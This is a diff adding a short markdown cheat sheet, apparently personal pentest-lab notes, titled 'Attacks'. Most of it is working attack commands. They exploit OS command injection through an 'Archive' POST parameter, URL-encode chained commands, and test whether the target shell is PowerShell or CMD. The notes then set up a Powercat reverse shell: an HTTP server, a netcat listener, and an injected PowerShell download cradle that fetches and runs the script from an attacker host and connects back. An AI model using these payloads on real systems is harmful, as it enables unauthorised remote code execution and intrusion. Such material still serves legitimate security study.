@@ -1,0 +1,27 @@
+# Attacks
+
+- Example ([[curl]])
+		- Using "Archive" as vulnerability
+			- curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
+			- curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
+			- curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive
+				- If Linux, wont say linux
+		- URL Encode two commands
+			- curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
+		- Determine if Powershell or CMD
+			- (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+		- URL Encode
+			- curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
+- Powercat
+			- Powershell Netcat listener in kali
+
+			- Copy Powercat to home directory
+				- cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+			- Start up py server
+				- python3 -m http.server 80
+			-  Start up  netcat
+				- nc -lvnp 4444
+			- Use PowerShell download cradle to load Powercat function contained in powercat.ps1 && use PowerCat to create reverse shell
+				- IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
+			- Encoded
+				- curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
